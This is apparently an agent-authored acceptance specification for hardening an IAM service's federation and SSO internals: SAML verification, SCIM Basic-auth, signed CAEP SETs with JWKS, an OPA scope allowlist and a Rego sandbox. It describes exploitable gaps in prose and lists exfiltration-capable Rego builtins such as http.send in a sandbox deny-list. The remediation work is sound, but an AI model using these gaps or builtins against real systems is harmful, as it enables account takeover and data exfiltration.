# Sub-phase W3.1 — Remediation Chunk 5: Federation / SSO internals — Acceptance

> **Status**: DRAFT (awaiting `acceptance-reviewer` per workspace `CLAUDE.md` §Запреты #1).
> **Date**: 2026-05-24
> **YouTrack**: KAC-W3.1 (subtask of `KAC-iam-prod-ready` master epic, sibling of W3.2 observability / W3.3 SPIRE+Cilium / W3.4 freeze).
> **Author agent**: `acceptance-author`
> **Reviewer agent**: `acceptance-reviewer`
> **Target repos**:
>   - **Primary**: `PRO-Robotech/kacho-iam` —
>     - `internal/apps/kacho/api/internal_authorize/handler.go` (`ReloadModel` #25, `RunRegoTest` #26)
>     - `internal/service/authorize_service.go` (`CheckRelation` context plumbing #23)
>     - `internal/apps/kacho/api/saml/sp_handler.go` (SAML AuthnResponse verify #40)
>     - `internal/apps/kacho/api/scim/auth.go` + `cmd/kacho-iam/phase6_listeners.go` (SCIM Basic-auth #41)
>     - `internal/handler/iamhooks/caep_egress_handler.go` (new) + `internal/service/caep/set_signer.go` (new) (CAEP SET signing #42)
>     - `internal/service/jwks/store.go` (new) + `internal/apps/kacho/api/internal_iam/handler.go::GetJWKSStatus` (extension) + REST `/.well-known/jwks.json` handler in `cmd/kacho-iam/main.go` (#42)
>     - `internal/service/opa_scope/allowlist.go` (new) + handler hooks in `opa_bundle_service` / `authorize_service` (#21)
>     - `migrations/0025_opa_scope_allowlist.sql` (new) — `kacho_iam.opa_scope_allowlist` table
>     - `migrations/0026_jwks_keys.sql` (new) — `kacho_iam.jwks_keys` table (signing keys, **internal-only on storage**)
>     - `migrations/0027_scim_basic_credentials.sql` (new) — `kacho_iam.scim_basic_credentials` table (per-tenant SCIM creds — bcrypt-hashed)
>     - `migrations/0028_saml_response_replay.sql` (new) — `kacho_iam.saml_response_replay` table (InResponseTo dedup)
>   - **Touched (kacho-proto)**: `kacho/cloud/iam/v1/internal_authorize_service.proto` (`RunRegoTest` request gets `module_imports[]` allow-list field + `cpu_timeout_ms` field; response gets `denied_reason` for sandbox rejections); `internal_iam_service.proto` (`GetJWKSStatus` extends to include `active_keys[]` count + `next_rotation_at`).
>   - **Touched (kacho-api-gateway)**: route table for `GET /.well-known/jwks.json` (public, anonymous-read; standard practice per RFC 7517) — added to existing `iam` block in `internal/restmux/mux.go`. SCIM endpoints already wired in W2.B.2; no change to gateway.
>   - **NOT touched**: `kacho-corelib` (no new horizontal cross-cutting needed — JWKS store + SET signer live in iam since only iam owns IdP signing identity). `kacho-vpc`, `kacho-compute` — no edges added.
> **Branch (all repos)**: `KAC-W3.1` (off `main`).
> **Parent epic plan**: `docs/superpowers/plans/2026-05-23-iam-prod-ready-master.md` Wave 3.
> **Wave plan**: `docs/superpowers/plans/2026-05-23-iam-prod-ready-wave3.md` §W3.1 (TBD — детальный план пишется при старте Wave 3).
> **Source of finding-level requirements**: `docs/superpowers/plans/2026-05-21-iam-authz-review-remediation-plan.md` §1.3 Chunk 5 (findings #21, #23, #25, #26, #40, #41, #42).
> **Predecessors (must be `main`-merged before impl starts)**:
> - **W2.B.1** (SAML ACS endpoint wired with explicit-disabled guard returning 501 per remediation-plan OQ-5). W3.1 #40 replaces the 501 guard with the **actual** signature verification path.
> - **W2.B.2** (SCIM v2 REST endpoints wired). W3.1 #41 closes the auth gap (currently anonymous-accessible per remediation-plan finding #41).
> - **W2.B.8** (CAEP push pipeline scaffolded — `caep_egress_handler.go` exists with a stub-sign that produces a JWT with `alg: none` for local testing). W3.1 #42 replaces stub-sign with JWS RS256 signing using JWKS.
> - **W2.A** (catalog/permissions unification, Chunk 3). W3.1 #21 OPA-scope-allowlist is per-tenant; the catalog defines the **set of catalogued scopes** that the allowlist references. W2.A must merge first so the allowlist enum-table can be populated by bootstrap from the catalog (or admin-UI surface lists catalogued scopes).
> - **W1.6** (Remediation Chunk 2). W1.6 §4.11 introduced the **explicit read-only allowlist** anti-anon interceptor — by default `Internal*` mutating RPCs (`ReloadModel`, `RunRegoTest`) are already anonymous-denied. W3.1 #25 is an explicit **reaffirm + cluster-admin gate** on top of anti-anon; without W1.6, anonymous bypass was possible via missing suffix match. W1.6 closes the anonymous bypass; W3.1 closes the *authenticated-non-admin* bypass.
>
> **Why W3.1 is the last hardening chunk before freeze**: per remediation plan §Часть 3 «5 чанков», Chunk 5 deals with federation / SSO internals — the surface most exposed to **external** principals (IdP-driven, SCIM-driven, vendor CAEP receiver). These findings are the **only** remaining P0/P1 holes that survive Wave 1+2; closing them brings the IAM prod-ready DoD (per master plan §Definition of Done) to «0 stub on surface, 0 latent-P0». W3.2 (observability) + W3.3 (SPIRE+Cilium) + W3.4 (freeze checklist) are non-correctness chunks layered on top.

---

## 0. Преамбула — что эта sub-итерация (précis)

W3.1 закрывает **семь** findings из remediation plan §1.3 Chunk 5, разбитых на три тематических группы:

1. **OPA / Rego authz internals** (#21, #25, #26) — control-plane endpoints для admin-UI и oncall, через которые сейчас можно (a) сослаться на любую произвольную scope-строку и обойти каталогизированный набор (#21), (b) перезагрузить FGA-модель без аутентификации (#25), (c) выполнить arbitrary Rego-программу без sandbox ограничений (#26). #25 — частично уже закрыт W1.6 anti-anon allowlist (anonymous → 401); W3.1 **дополнительно** гейтит на cluster-admin role и расширяет ту же логику на #26.
2. **Federation conditional binding context** (#23) — `IAMService.CheckRelation` сейчас игнорирует `request_context` jsonb-поле (ABAC attributes: MFA-freshness, source-IP, device-trust, time-of-day). Поле существует в proto (KAC-127 frozen), но handler не пробрасывает его в OpenFGA `Check(... ContextualTuples)`. Эффект: conditional bindings (e.g. «admin only with MFA fresh») всегда deny на internal-gate; admin-UI tests show «MFA required» as static deny.
3. **External-IdP-facing auth/signature hardening** (#40, #41, #42) — три endpoint'а, через которые external systems взаимодействуют с iam как с **первоклассным IdP / Receiver**:
   - #40 SAML AuthnResponse — XML-signature verification + replay protection + recipient/audience binding. W2.B.1 поставила только защиту-guard (501) против JIT-provisioning без verify; W3.1 — реальная реализация.
   - #41 SCIM v2 endpoints — Basic-auth header верификация (W2.B.2 поставил endpoints, без auth gap = anonymous может POST/GET/DELETE SCIM users).
   - #42 CAEP SET signature — Security Event Tokens (RFC 8417) сейчас отправляются с `alg: none`-стаб-подписью; W3.1 поставляет JWS RS256 + JWKS publishing endpoint.

Каждый из семи findings закрывается одной парой `RED (failing integration/newman test) → GREEN (impl)`. См. §5 для распределения; §6 — GWT сценарии; §7 — test plan; §8 — DoD; §9 — vault updates.

W3.1 **не** меняет authz-decision pipeline (gateway middleware / FGA evaluator) — это W1.3/W1.5/W2.A. W3.1 **не** добавляет новые RPC в *публичные* сервисы (FederationExchangeService / SAKeyService / AccessBindingService — без изменений). W3.1 расширяет **только** Internal-admin RPCs и REST IdP-facing endpoints (SAML ACS, SCIM v2, JWKS, CAEP push).

### 0.1 W3.1 НЕ включает

- **Observability customisation** — VictoriaMetrics dashboards, alert rules, anti-anon-deny / SAML-reject / SCIM-401 / SET-badsig metrics → **W3.2** (`sub-phase-W3.2-observability-customisation-acceptance.md`, TBD). W3.1 emits **structured logs** with `event:` tags (`saml_signature_invalid`, `scim_auth_failed`, `caep_jwks_lookup_failed`, `rego_sandbox_blocked`, `opa_scope_not_allowlisted`) — dashboard wiring is W3.2.
- **SPIRE + Cilium wiring** — kacho-iam за SVID mTLS identity → **W3.3** (TBD). W3.1 assumes existing K8s NetworkPolicy + token-based authn between iam and gateway; SPIRE-based identity for SAML/SCIM/CAEP клиентов — out of scope (those are external systems, не in-cluster workloads).
- **Freeze checklist** — final gate before Wave 4 freeze (security review, pentest readiness, runbook completeness) → **W3.4** (TBD).
- **OPA bundle resilience** — bundle fetch / signature verify on the OPA-sidecar side (referenced in W1.3 §0.1 as out-of-scope of gateway). The Rego sandbox in #26 is for `InternalAuthorize.RunRegoTest` admin-diagnostic path only — **not** the runtime evaluator. Runtime OPA-sidecar bundle path is hardened separately (KAC-127 Phase 3 already requires bundle-signing JWS; verified by sidecar config `bundle-signing-key` in `helm/umbrella/values.yaml`).
- **CheckRelation в публичном `AuthorizeService.Check`** — #23 затрагивает только `InternalIAMService.CheckRelation` (admin-UI checker / gateway-internal). Public `AuthorizeService.Check` уже плюмит `request_context` через `Check(... ContextualTuples)` (verified in W1.3 cross-check `authorize_service.go::Check`). W3.1 закрывает **только** internal-side рассинхрон.
- **Federation Exchange scope-allowlist (#21 federation-side)** — disambiguation: remediation plan §1.3 Chunk 5 item 5.1 «#21 federation scope-allowlist» — это про `FederationExchangeService.Exchange` `RequestedScope`-intersection с `FederationTrustPolicy.allowed_scopes[]`. Та часть **уже** закрыта в **W2.B.6** (`FederationTrustPolicy.allowed_scopes` field + migration + Exchange intersection). W3.1 #21 — **другая** scope-allowlist: OPA-endpoint-level «какие scope-строки legitimate для `/opa/compile/v1` + `/opa/data/v1/iam/*` request». Эти две allowlist'ы орто́гональны (Federation = OAuth scope; OPA = policy-package scope). См. §3 Decision DEC-W3.1-1 для номенклатуры.
- **Rego unit-test runner for production rules** — `RunRegoTest` остаётся admin-diagnostic RPC; production OPA evaluation идёт через OPA-sidecar, не через iam-RPC. W3.1 sandbox защищает админ-инструмент от RCE-style abuse, не reimplements OPA.

| # | Sev | File:line (target / verified 2026-05-24) | Симптом | Fix |
|---|---|---|---|---|
| **#21** | P0 | `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest`, future `OpaService` endpoints (`/opa/compile/v1`, `/opa/data/v1/iam/*` — REST mapped from `InternalAuthorizeService` admin paths) | OPA-endpoint принимает arbitrary `scope`-строку (e.g. `data.iam.users`, но также `data.attacker_controlled.malicious_rule`) без проверки, что эта scope каталогизирована. Permits enumeration of internal policy packages и потенциально trigger'ит eval против неполной/тестовой policy. | Добавить per-tenant allowlist `kacho_iam.opa_scope_allowlist (tenant_id text, scope text, created_at timestamptz, PRIMARY KEY (tenant_id, scope))`. На handler-уровне: до eval — `SELECT 1 FROM opa_scope_allowlist WHERE tenant_id=$caller_tenant AND scope=$req_scope` — если 0 rows → `codes.PermissionDenied` с текстом `"Illegal argument scope: scope %q is not in tenant allowlist"`. Bootstrap-seed для well-known scopes: `data.iam.users`, `data.iam.roles`, `data.iam.bindings`, `data.iam.projects`. Empty allowlist (mis-bootstrap) → **fail-closed all** (`PermissionDenied`), не «empty = allow-all». |
| **#23** | P1 | `internal/service/authorize_service.go::CheckRelation` (внутренний путь, отличный от public `Check`); `internal/apps/kacho/api/internal_iam/handler.go::Check` (proxy в `authorize_service.CheckRelation`) | `request_context` поле (jsonb из proto `CheckRelationRequest`, ABAC attributes — `mfa_fresh`, `source_ip`, `device_trust_level`, `time_of_day`) **не пробрасывается** в OpenFGA `Check(... ContextualTuples)`. ABAC-aware conditional bindings (e.g. `permit admin only if mfa_fresh==true`) всегда возвращают deny на internal path. | `CheckRelation` строит `[]openfgav1.TupleKey` из `request_context` map'а (key→value pairs as ContextualTuples с relation `attr_<key>`), передаёт в `client.Check(...)` SDK-параметром `ContextualTuples`. Существующий path уже plumbит `current_time` — расширяем общий механизм. Malformed `request_context` (не-jsonb / nested-too-deep) → `codes.InvalidArgument`. |
| **#25** | P0 | `internal/apps/kacho/api/internal_authorize/handler.go::ReloadModel` (`:127-135` — мутирует `h.currentModelID` без auth-check) | До W1.6: anonymous мог вызвать `InternalAuthorizeService.ReloadModel` — внутренний listener-level trust ассумировал, что cluster-mTLS уже фильтрует, но в dev/test без mTLS — anonymous bypass. После W1.6: anti-anon allowlist denies anonymous, но **authenticated non-admin** всё ещё может вызвать (anti-anon только anti-anon, не authz). | На handler-уровне: `principal := authzguard.PrincipalUserID(ctx); if principal == "" { return PermissionDenied }` (defensive reaffirm anti-anon); затем `if !s.fga.HasClusterAdminGrant(ctx, principal) { return PermissionDenied("ReloadModel requires cluster-admin grant") }`. Cluster-admin = `cluster_admin_grants`-row (W1.5 break-glass approve) OR bootstrap-principal. Symmetric для `RunRegoTest`. Audit log: `event: iam_admin_reload_model, principal:, model_id:, outcome:`. |
| **#26** | P0 | `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest` (`:111-124` — текущая impl возвращает `Unimplemented`; W3.1 включает реализацию для admin-diagnostic + sandbox) | Если включить реализацию без sandbox: arbitrary Rego program execution в process-pamяти iam → DOS (infinite loop, memory exhaustion), exfiltration via `http.send`, side-channel via `time.now_ns` non-determinism. | Sandbox layered: (a) **parser-time deny-list** — отказ при наличии `http.send`, `net.lookup_ip_addr`, `opa.runtime`, `io.*` builtins (parse Rego AST, walk function-call nodes, reject); (b) **CPU budget** — `ctx, cancel := context.WithTimeout(ctx, req.GetCpuTimeoutMs() * time.Millisecond); defer cancel()`, hard cap 5000ms via Go config; (c) **memory budget** — `rego.Module*Limit(8MB)` (OPA Go SDK config); (d) **import allowlist** — request-field `module_imports[]` ⊆ {`data.iam.users`, `data.iam.roles`, `data.iam.bindings`, `data.iam.projects`} (parity с #21 allowlist); unknown import → reject. Combined with #25 (cluster-admin gate) — only trusted operators can even reach the sandboxed eval. |
| **#40** | P0 | `internal/apps/kacho/api/saml/sp_handler.go:180` (W2.B.1 reads `subject` / `email` from raw form values; signature verify path is `OnSAMLAssertion: nil` → ACS returns 501; W3.1 fills it in) | Without verify: a malicious POST to `/saml/v2/acs` could JIT-provision arbitrary user (`email=admin@victim.com`). W2.B.1 prevented it by returning 501 — defensive but blocks legitimate SAML SSO. W3.1 enables actual verify so SSO works. | Full XML-DSig verification path (use `crewjam/saml` library or `russellhaering/gosaml2` — see DEC-W3.1-3): (1) load IdP cert (per-tenant from `federation_trust_policies.idp_cert_pem`); (2) verify XML signature on `<samlp:Response>` AND on `<saml:Assertion>` — fail if either invalid; (3) signature algorithm allowlist: `rsa-sha256`, `rsa-sha384`, `rsa-sha512` — reject `rsa-sha1` and `dsa-*`; (4) `InResponseTo` binding — must match a previously-issued `<samlp:AuthnRequest>` ID (stored in `saml_response_replay` table with TTL 5min, deleted on first match → replay-proof); (5) `NotBefore` / `NotOnOrAfter` window check (clock skew tolerance ±60s); (6) `Recipient` = `https://<our-acs-url>` (constant from config); (7) `Audience` = our SP entity-ID. All seven checks → JIT-provision user; any fail → reject + structured audit log. Wire `OnSAMLAssertion: h.handleVerifiedAssertion`. |
| **#41** | P0 | `internal/apps/kacho/api/scim/auth.go:42-78` (`BasicAuthOrgID:""` per W2.B.2 — Basic-auth path disabled); `cmd/kacho-iam/phase6_listeners.go` (Basic creds not loaded from config) | SCIM v2 POST/GET/PUT/DELETE endpoints publicly accessible: anonymous CRUD over `/scim/v2/Users`, `/scim/v2/Groups`. External attacker can provision arbitrary users into any tenant. | New table `kacho_iam.scim_basic_credentials (tenant_id text, username text, password_bcrypt text NOT NULL, created_at timestamptz NOT NULL, last_used_at timestamptz, PRIMARY KEY (tenant_id, username))`. Admin-UI provisions per-tenant SCIM credential (POST `/iam/v1/scim_credentials` — new Internal RPC). Middleware reads `Authorization: Basic <base64(user:pass)>` header; `bcrypt.CompareHashAndPassword` (constant-time); missing header → 401 with `WWW-Authenticate: Basic realm="SCIM"`; wrong creds → 401 (same shape, same latency via `subtle.ConstantTimeCompare` after bcrypt). Successful auth → set `tenant_id` context; SCIM CRUD operates within that tenant only. |
| **#42** | P0 | `internal/handler/iamhooks/caep_egress_handler.go` (W2.B.8 produces SET JWT with `alg: none`); subscriber currently accepts without verify (test-stub) — production subscribers per RFC 8417 §7.2 REQUIRE signed SETs. | Stub-sign means: any in-cluster actor can craft `iam.session.revoked` SET claiming arbitrary subject — subscribers acting on it would revoke wrong user's session. Outside cluster: stub-sign means subscribers either reject (no verify against JWKS) or accept-without-verify (insecure). | (1) Generate RS256 key pair on first iam-startup; store private key in `kacho_iam.jwks_keys (kid text PRIMARY KEY, alg text NOT NULL CHECK (alg='RS256'), public_key_pem text NOT NULL, private_key_pem_encrypted text NOT NULL, active boolean NOT NULL, created_at timestamptz NOT NULL, rotated_at timestamptz, expires_at timestamptz NOT NULL)`. `private_key_pem_encrypted` = AES-GCM via `KACHO_IAM_JWKS_MASTER_KEY` env (SealedSecret in prod) — **internal-only on storage**, NEVER returned via any RPC. (2) `SetSigner.Sign(claims)` — produce JWS RS256 with `kid` header = current `active=true` row. (3) REST endpoint `GET /.well-known/jwks.json` (public, anonymous-read, RFC 7517 standard) — returns `{keys: [...]}` with **only public-key half** (`n`, `e` JWK fields) — never private key material. (4) Rotation: monthly cron job creates new `active=true` key, marks old as `active=false` (still served in JWKS for 60-day overlap to absorb in-flight verification, then row deleted after `expires_at`). (5) Subscribers fetch `/.well-known/jwks.json`, verify SET signature against `kid`-matched key — invalid signature / unknown `kid` / `kid` not in JWKS → subscriber rejects (proves the JWKS lookup is the source of truth). |

### 0.2 Зависимости и cross-chunk сцепления

- **W2.B.1 + W2.B.2 + W2.B.8 must be `main`-merged before W3.1 impl.** Without W2.B.1: no SAML ACS endpoint to verify. Without W2.B.2: no SCIM endpoints to auth-gate. Without W2.B.8: no CAEP push pipeline to sign.
- **W2.A (catalog/permissions unification)**: bootstrap-seed для `opa_scope_allowlist` (#21) пулит scope-список из единого каталога; без W2.A — захардкоженный список из 4 scopes (`data.iam.users/roles/bindings/projects`).
- **W1.6 (Chunk 2 anti-anon allowlist)**: предусловие для #25 + #26 — anti-anon уже отсекает anonymous; W3.1 поверх добавляет cluster-admin requirement.
- **W1.5 (FGA grant outbox)**: `cluster_admin_grants` table populated through `bootstrap_admin` path + W1.5 BreakGlass.ApproveB path. W3.1 #25 reads from this table for cluster-admin check.

### 0.3 Финальный gate W3.1 vs freeze

После W3.1 merge: ноль stub'ов на surface (включая SCIM Basic-auth dead-code от W2.B.2; включая SAML 501-guard от W2.B.1; включая CAEP `alg: none`-стаб от W2.B.8). Все 7 findings closed. Master plan §«Definition of Done» pkt 1-2 («0 stub / 0 disabled-by-config», «44 findings closed») в этой части — выполнен.

---

## 1. Связь с регламентом (нормативно)

| Регламент | Где соблюдаем |
|---|---|
| **Запрет #1** (acceptance-gate) | этот документ — gate; impl стартует только после ✅ APPROVED от `acceptance-reviewer`. |
| **Запрет #2** (no «yandex») | ни в коде, ни в комментариях, ни в тестах, ни в audit-event names. |
| **Запрет #3** (no ORM) | handwritten pgx + sqlc для всех новых таблиц (`opa_scope_allowlist`, `jwks_keys`, `scim_basic_credentials`, `saml_response_replay`). |
| **Запрет #4** (no cross-service cascade) | within-iam-DB only. JWKS rotation cascade — same-schema. SCIM tenant-id ссылка на `accounts.id` — same-DB FK. |
| **Запрет #5** (no edit applied migration) | 4 новые migration файла (0025/0026/0027/0028); 0001-0024 не трогаем. |
| **Запрет #6** (`Internal.*` separation) | `ReloadModel`, `RunRegoTest`, новые SCIM-credential admin RPCs — **строго на internal-listener (port 9091)**. SAML ACS / SCIM v2 / `/.well-known/jwks.json` — public (vendor-callable, как должно быть). См. CLAUDE.md §«Запреты» #6 + §«Admin-UI правило» — SCIM-credential admin RPC = `InternalScimCredentialService` на internal-port. |
| **Запрет #7** (no broker) | CAEP push — direct HTTP POST к subscriber URL; in-process queue (corelib `outbox`-pattern для retry); no Kafka/NATS. |
| **Запрет #8** (DB-per-service) | Все 4 новые таблицы — в `kacho_iam`-схеме. Никаких cross-DB FK. |
| **Запрет #9** (mutation = async) | `ReloadModel`, `RunRegoTest` — admin-diagnostic, sync (как уже было); не требуют `Operation`-envelope. SAML JIT-provisioning user — генерирует `Operation` через существующий `UserService.Create` use-case. SCIM CRUD — wrapped в Operations через существующий SCIM-handler convention. SET signing — sync (subscriber-blocking-call вне scope). |
| **Запрет #10** (within-service refs DB-level) | `jwks_keys` — `partial UNIQUE` на `(active) WHERE active=true` гарантирует **ровно одну** active key (CAS на rotation: `BEGIN; UPDATE jwks_keys SET active=false WHERE active=true; INSERT new active=true; COMMIT;` — atomic via partial UNIQUE). `saml_response_replay (response_id text PRIMARY KEY, ...)` — PRIMARY KEY ловит replay (insert конфликт = 23505 → 401). `opa_scope_allowlist (tenant_id, scope) PRIMARY KEY` — composite uniqueness. `scim_basic_credentials (tenant_id, username) PRIMARY KEY` — same. Никакого software refcheck — все инварианты на DB-уровне. |
| **Запрет #11** (no TODO / no tech debt) | Все 7 findings закрываются полностью в W3.1; никаких `TODO(KAC-N): implement later`. Если acceptance-reviewer считает SAML/SCIM/CAEP scope слишком большим — split на W3.1a/W3.1b (отдельные acceptance docs), не TODO. |
| **Запрет #12** (test-first STRICT) | RED phase commit ПЕРВЫМ: integration tests + newman cases на каждый из 7 findings; GREEN phase — по одному finding'у с per-fix evidence «RED→GREEN» в PR описании. См. §5 + §7. |
| **CLAUDE.md §«Инфра-чувствительные данные»** | SAML IdP private key (если iam — SP, not IdP, то частный case: private key — *подписной ключ нашего AuthnRequest*; в любом случае — internal-only на storage, NEVER в RPC response). JWKS signing key (private половина `jwks_keys.private_key_pem_encrypted`) — internal-only, encrypted-at-rest via master key. Public половина — single-purpose endpoint `/.well-known/jwks.json` (стандарт RFC 7517 — публично-читаемый JSON Web Key Set, это и есть его function). SCIM bcrypt-hashes — internal-only (никогда не возвращаются в Get-RPC, только presence-bool). |
| **CLAUDE.md §«Within-service refs DB-уровень обязателен»** | См. Запрет #10 выше — partial UNIQUE, composite PK, atomic rotation; никаких TOCTOU patterns. |
| **Vault discipline** | KAC-W3.1 trail; NEW `resources/iam-opa-scope-allowlist.md`, NEW `resources/iam-jwks.md` (с public-key-only emphasis), UPDATE 4 RPC notes + 3 NEW edges. См. §9. |

---

## 2. Глоссарий

- **SET** (Security Event Token) — RFC 8417 формат JWT-based event token для CAEP / RISC / SSE стандартов. Тело — set of JWT claims включая `iss`, `aud`, `iat`, `jti`, `sub_id`, `events`-map (e.g. `{"https://schemas.openid.net/secevent/caep/event-type/session-revoked": {...}}`). Подписывается JWS (RFC 7515).
- **JWS** (JSON Web Signature) — RFC 7515 формат подписи. `alg=RS256` — RSA-SHA256, стандарт для SSE/CAEP. Структура: `header.payload.signature` (base64url-encoded).
- **JWKS** (JSON Web Key Set) — RFC 7517 формат для публикации публичных ключей. Endpoint convention: `/.well-known/jwks.json`. Subscribers fetch JWKS, match `kid` header из JWT к ключу в set'е, verify signature.
- **Rego sandbox** — set of restrictions на arbitrary Rego execution: (a) AST-level deny-list для opasive built-ins (`http.send`, `time.now_ns`, etc), (b) CPU timeout (`context.WithTimeout`), (c) memory limit (OPA SDK `RuntimeOpts`), (d) import allowlist (только catalogued data sources).
- **ContextualTuples** — OpenFGA SDK concept: tuples которые **не** записаны в FGA store, но **прибавляются** на момент `Check` call для ABAC-style decisioning. Typical use: pass `mfa_fresh=true` как tuple `(user:U, attr_mfa_fresh, value:true)` для conditional binding evaluation.
- **Scope-allowlist (OPA)** — per-tenant whitelist of legitimate OPA scope-strings (e.g. `data.iam.users`). Disambiguation от Federation scope-allowlist (W2.B.6, `FederationTrustPolicy.allowed_scopes` — OAuth scope intersection): OPA scope = policy package address; OAuth scope = OAuth2 access-token grant. См. DEC-W3.1-1.
- **Replay protection (SAML)** — once-only consumption: `<samlp:Response>.ID` + `<samlp:Response>.InResponseTo` записываются в `saml_response_replay` table при первом ACS-приёме; повторный POST с тем же `ID` → 401 на основе PK-conflict.
- **SCIM v2** — RFC 7644 «System for Cross-domain Identity Management» — REST CRUD over `/scim/v2/Users`, `/scim/v2/Groups`. Auth — Basic или Bearer; W3.1 implements Basic per finding #41 scope.
- **CAEP** (Continuous Access Evaluation Profile) — OpenID spec для real-time event push: «user X token revoked», «user Y device-trust changed». Receiver subscribes; sender pushes SET via webhook. RFC 8417 SET format.
- **kid** (JSON Web Key ID) — `kid` header field in JWT/JWS, points to specific key in JWKS by ID. Allows rotation: subscribers can verify both old and new during overlap.
- **Cluster-admin grant** — `cluster_admin_grants`-row (KAC-122 §5; W1.5 BreakGlass.ApproveB writes). FGA-relation `cluster:default#system_admin@user:X`. Used for high-priv admin RPCs (ReloadModel, RunRegoTest).

---

## 3. Decisions (принимаются acceptance-reviewer'ом до старта impl)

| ID | Решение |
|---|---|
| **DEC-W3.1-1** (#21 storage) | **OPA scope-allowlist хранится в DB как table `kacho_iam.opa_scope_allowlist (tenant_id text, scope text, ...)`, не как proto enum.** Reasoning: (a) per-tenant extensibility — different tenants могут добавить own custom OPA data sources (W3+ когда tenant-specific Rego packages поддерживаются); (b) admin-UI editable без proto-regenerate cycle; (c) bootstrap-seed populated from W2.A catalog, но modifiable runtime. **Не** proto enum: hardcoded list требует proto-change для добавления scope (high-friction). Allowlist в Federation для `FederationTrustPolicy.allowed_scopes` — `repeated string` proto field (т.к. там это уже tenant-specific config — `FederationTrustPolicy`-row); для OPA scope-allowlist та же логика — extracted в отдельную таблицу для admin-UI extensibility. |
| **DEC-W3.1-2** (#26 sandbox enforcement) | **Sandbox bound по 4 dimensions одновременно: (a) parser-time AST walk + built-in deny-list (compile-time reject); (b) `context.WithTimeout(req.cpu_timeout_ms || default 5000)` для CPU cap; (c) `rego.RuntimeOpts(...)` memory cap 8MB hard; (d) `module_imports[]` request-field — explicit allowlist ⊆ catalogued scopes (#21 parity).** Если any dimension fails → `codes.PermissionDenied` с `denied_reason` field в response (new proto field per §0 table). Не используем seccomp/cgroups — слишком тяжело для in-process RPC; pure-Go SDK-level enforcement достаточен для diagnostic use-case (cluster-admin only path per #25). |
| **DEC-W3.1-3** (#40 SAML library choice) | **`crewjam/saml` (BSD-2)** — single, well-maintained Go SAML library с поддержкой XML-DSig verify + replay store hook (custom `RequestTracker`). Альтернативы: `russellhaering/gosaml2` (более-low-level, требует ручной XML-DSig wiring). Решение: `crewjam/saml` + кастомный `RequestTracker` который пишет/читает из `saml_response_replay` (PostgreSQL-backed, не in-memory как dev-default). Algorithm-allowlist (RS256+) — встроен (отказать `rsa-sha1` явным конфиг-флагом `crewjam/saml.ServiceProvider.AcceptedResponseSigningAlgorithms = ["rsa-sha256", "rsa-sha384", "rsa-sha512"]`). |
| **DEC-W3.1-4** (#42 JWKS rotation policy) | **30-day rolling rotation, 60-day overlap window.** Cron job (in-iam, использует corelib `outbox`-pattern для idempotency): every 30 days — `INSERT new active=true; UPDATE old active=false`. Old key remains in JWKS (RFC 7517 set) для 60 дней (subscribers могут иметь cached JWTs in-flight). После 60 дней — old key row deleted, не появляется в `/.well-known/jwks.json`. **Manual rotation override** — admin RPC `InternalJWKSService.Rotate` (cluster-admin gated) для compromise-recovery (immediate new-key + old-key invalidate within minutes — distribute via `Cache-Control: max-age=60` header на JWKS endpoint). Storage: `jwks_keys.expires_at = created_at + INTERVAL '90 days'`; periodic cleanup. |
| **DEC-W3.1-5** (#41 bcrypt cost) | **bcrypt cost 12** (industry-standard 2024+). Hash check on every SCIM request (no caching of hash-results) — vendor SCIM clients typically issue 1-2 requests/sec per tenant, 12-cost bcrypt = ~250ms — acceptable. Constant-time comparison via `bcrypt.CompareHashAndPassword` (standard library, internally constant-time over equal-length inputs); plus `subtle.ConstantTimeCompare` для username field. |
| **DEC-W3.1-6** (#42 stub-sign removal — backward compat) | **Drop stub-sign in same PR as JWKS impl.** Per CLAUDE.md memory `feedback-no-strict-backward-compat-on-major-rewrite` — W3.1 — production hardening, не major rewrite; но stub-sign не used in prod (W2.B.8 explicitly scaffolded with stub for in-cluster test only). Dropping stub-sign in W3.1 PR: subscribers must obtain JWKS-verified path or reject. No backward-compat for stub-sign — never was a contract. |
| **DEC-W3.1-7** (#25 cluster-admin source) | **`cluster_admin_grants`-row via existing FGA-grant path (`bootstrap_admin` + W1.5 BreakGlass.ApproveB).** Helper `iam.IsClusterAdmin(ctx, principal_id) bool` — lazy FGA `Check(cluster:default, system_admin, user:<id>)`; cached via gateway authz cache (W1.2 path) с TTL 60s. Не reinvent — переиспользуем W1.5/W1.2/W1.6 infrastructure. |

---

## 4. Open questions (DECISION-NEEDED) — нужно разрешить до старта impl

| ID | Вопрос | Рекомендация автора |
|---|---|---|
| **OQ-W3.1-1** | #40 SAML: support multiple IdPs per tenant (e.g. one tenant federates from Okta + Azure AD одновременно)? Текущий `federation_trust_policies`-table — один row per (tenant_id, idp_id). | **Да, multi-IdP supported уже сейчас** — `federation_trust_policies` PK = `(tenant_id, idp_id)`. W3.1 SAML verify читает IdP cert по `<saml:Issuer>` field из AuthnResponse → выбор правильной row по `(tenant_id, issuer_uri)`. Audit log включает `idp_id` для traceability. |
| **OQ-W3.1-2** | #41 SCIM: deletion vs deprovision — DELETE на `/scim/v2/Users/<id>` ставит user в `inviteStatus=DISABLED` или физически удаляет row? | **DISABLED, not physical delete.** RFC 7644 §3.6 allows DELETE to be a soft-delete по implementation choice; KAC-127 user lifecycle requires audit trail → soft-delete. DELETE → `UserService.Block` (existing). 410 Gone on subsequent GET. |
| **OQ-W3.1-3** | #42 CAEP: subscriber list — где хранится? Per-tenant `caep_subscribers (tenant_id, endpoint_url, public_jwks_url, events[])` table? | **Да, new table `kacho_iam.caep_subscribers`** — но **out of scope W3.1** (scaffolding в W2.B.8). W3.1 focuses on **signing** (sender-side); subscriber-discovery + push-retry — W2.B.8 territory. W3.1 verifies subscribers can verify signed SETs (newman test posts SET to test-subscriber stub which validates against `/.well-known/jwks.json`). |
| **OQ-W3.1-4** | #25 #26: cluster-admin gated на BOTH `ReloadModel` + `RunRegoTest`. Не сужает ли это admin-UI use case (oncall-engineer без cluster-admin grant не может trigger RunRegoTest для diagnostics)? | **Acceptable — diagnostic админ-ops require cluster-admin per KAC-122 §5.** Oncall workflow per runbook: BreakGlass-flow (2-person approve) → temporary cluster-admin grant → diagnostic ops. Если W3.4 (freeze) reveals friction → дополнительный `diagnostic_operator` relation (separate from `system_admin`) — это W4+. W3.1 ставит правильную fail-closed baseline. |
